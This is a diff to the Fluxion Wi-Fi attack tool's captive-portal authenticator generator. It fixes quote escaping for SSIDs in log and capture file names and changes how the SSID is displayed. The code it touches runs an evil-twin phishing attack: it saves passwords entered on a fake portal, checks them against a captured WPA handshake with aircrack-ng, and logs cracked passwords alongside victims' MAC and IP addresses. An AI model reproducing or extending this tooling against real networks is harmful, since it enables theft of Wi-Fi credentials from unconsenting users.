@@ -641,7 +641,7 @@ while [ \$AuthenticatorState = \"running\" ]; do
 		fi
 
 		# Save any new password attempt.
-		cat \"$FLUXIONWorkspacePath/pwdattempt.txt\" >> \"$CaptivePortalPassLog/$APTargetSSIDClean-$APTargetMAC.log\"
+		cat \"$FLUXIONWorkspacePath/pwdattempt.txt\" >> \"$CaptivePortalPassLog/${APTargetSSIDClean//\"/\\\"}-$APTargetMAC.log\"
 
 		# Clear logged password attempt.
 		echo -n > \"$FLUXIONWorkspacePath/pwdattempt.txt\"
@@ -652,7 +652,7 @@ while [ \$AuthenticatorState = \"running\" ]; do
 		echo "
 	if [ -f \"$FLUXIONWorkspacePath/candidate_result.txt\" ]; then
 		# Check if we've got the correct password by looking for anything other than \"Passphrase not in\".
-		if ! aircrack-ng -w \"$FLUXIONWorkspacePath/candidate.txt\" \"$FLUXIONWorkspacePath/$APTargetSSIDClean-$APTargetMAC.cap\" | grep -qi \"Passphrase not in\"; then
+		if ! aircrack-ng -w \"$FLUXIONWorkspacePath/candidate.txt\" \"$FLUXIONWorkspacePath/${APTargetSSIDClean//\"/\\\"}-$APTargetMAC.cap\" | grep -qi \"Passphrase not in\"; then
             echo \"2\" > \"$FLUXIONWorkspacePath/candidate_result.txt\"
 
 			sleep 1
@@ -665,12 +665,13 @@ while [ \$AuthenticatorState = \"running\" ]; do
 	fi" >> "$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
 	fi
 
+	local staticSSID=$(printf "%q" "$APTargetSSID" | sed -r 's/\\\ / /g' | sed -r "s/\\\'/\'/g")
 	echo "
 	DHCPClients=($(nmap -PR -sn -n -oG - $VIGWNetwork.100-110 2>&1 | grep Host))
 
 	echo
 	echo -e \"  ACCESS POINT:\"
-	echo -e \"    SSID ...........: $CWht$APTargetSSIDEscaped$CClr\"
+	printf  \"    SSID ...........: $CWht%s$CClr\\n\" \"$staticSSID\"
 	echo -e \"    MAC ............: $CYel$APTargetMAC$CClr\"
 	echo -e \"    Channel ........: $CWht$APTargetChannel$CClr\"
 	echo -e \"    Vendor .........: $CGrn${APTargetMaker:-UNKNOWN}$CClr\"
@@ -729,9 +730,9 @@ if [ ! -d \"$CaptivePortalNetLog\" ]; then
 fi
 
 echo \"
-FLUXION $FLUXIONVersion
+FLUXION $FLUXIONVersion.$FLUXIONRevision
 
-SSID: $APTargetSSIDEscaped
+SSID: \\\"$staticSSID\\\"
 BSSID: $APTargetMAC ($APTargetMaker)
 Channel: $APTargetChannel
 Security: $APTargetEncryption
@@ -739,11 +740,11 @@ Time: \$ih\$h:\$im\$m:\$is\$s
 Password: \$(cat $FLUXIONWorkspacePath/candidate.txt)
 Mac: $(captive_portal_get_IP_MAC)
 IP: $(captive_portal_get_client_IP)
-\" >\"$CaptivePortalNetLog/$APTargetSSIDClean-$APTargetMAC.log\"" >> "$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
+\" >\"$CaptivePortalNetLog/${APTargetSSIDClean//\"/\\\"}-$APTargetMAC.log\"" >> "$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
 
 	if [ $APRogueAuthMode = "hash" ]; then
 		echo "
-aircrack-ng -a 2 -b $APTargetMAC -0 -s \"$FLUXIONWorkspacePath/$APTargetSSIDClean-$APTargetMAC.cap\" -w \"$FLUXIONWorkspacePath/candidate.txt\" && echo && echo -e \"The password was saved in "$CRed"$CaptivePortalNetLog/$APTargetSSIDClean-$APTargetMAC.log"$CClr"\"\
+aircrack-ng -a 2 -b $APTargetMAC -0 -s \"$FLUXIONWorkspacePath/${APTargetSSIDClean//\"/\\\"}-$APTargetMAC.cap\" -w \"$FLUXIONWorkspacePath/candidate.txt\" && echo && echo -e \"The password was saved in "$CRed"$CaptivePortalNetLog/${APTargetSSIDClean//\"/\\\"}-$APTargetMAC.log"$CClr"\"\
 " >> "$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
 	fi
 
